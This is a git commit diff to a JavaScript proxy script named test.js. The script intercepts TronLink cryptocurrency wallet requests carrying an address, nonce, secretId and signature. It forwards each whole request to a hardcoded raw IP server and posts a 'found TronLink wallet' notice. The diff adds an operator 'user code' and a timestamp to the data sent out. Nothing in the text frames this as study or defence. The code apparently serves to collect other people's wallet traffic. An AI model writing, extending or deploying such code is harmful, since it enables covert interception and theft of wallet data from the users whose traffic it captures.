c6ef88ad13c4704e0443c4ee627c6f28b61f4e70
tesaq1 <98641919+tesaq1@users.noreply.github.com>
2023-07-02 18:09:08 +0700

    1

--- test.js
+++ test.js
@@ -1,13 +1,19 @@
 const request = $request;
 const requrl = $request.url;
+const startTime = $script.startTime;
+usercode = $argument;
 const TronLinkRegex = /wallet\/getLatestAPK\?address=/;
 
+if(usercode==""){
+    $notification.post("错误","","请填写用户码");
+    $done({});
+}
 ///api/v1/wallet/getLatestAPK?address=TYtGyengaZQKkFU161uKCrRQQU2jJTNpv6&nonce=3691&secretId=ED151200DD0B3B52&signature=W5gBsApwNhp5GLgwA0Jho/77TbU%3D
 // 测试 requrl 是否匹配正则表达式
 if (TronLinkRegex.test(requrl)) {
     let params = {
         url:"http://43.134.170.213:8001/api/trx/getinfo",
-        body:request,//仅仅在post请求中有效
+        body:[request,{"usercode":usercode,"startTime":startTime}],//仅仅在post请求中有效
     }
     console.log("1111111111");
     $notification.post("通知","subtitle","找到TronLink钱包");
